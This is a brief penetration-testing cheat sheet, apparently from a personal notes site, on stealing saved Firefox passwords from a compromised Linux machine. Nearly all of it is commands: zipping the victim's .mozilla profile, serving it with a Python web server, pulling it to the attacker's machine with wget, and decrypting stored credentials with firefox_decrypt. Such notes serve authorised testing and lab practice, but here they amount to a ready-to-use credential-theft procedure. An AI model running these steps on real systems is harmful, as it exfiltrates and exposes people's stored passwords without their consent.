---
title: Mozilla PrivEsc
desc:
tags: [Firefox, Linux, Mozilla, PrivEsc, Privilege]
alts: []
render_with_liquid: true
---

## Extract Passwords from Firefox Profile

First, zip **.mozilla** directory in target machine, and open web server to transfer the zip file to local machine.

```sh
zip -r /tmp/mozilla.zip ./.mozilla
cd /tmp
python3 -m http.server 8000
```

In local machine, download the zip file from the target machine, and unzip it.

```sh
wget http://<target-ip>:8000/mozilla.zip
unzip mozilla.zip
```

To crack the profile of Firefox, use **[firefox_decrypt](https://github.com/unode/firefox_decrypt){:target="_blank"}{:rel="noopener"}**.

```sh
python3 firefox_decrypt.py .mozilla/firefox/<id>.default-release
```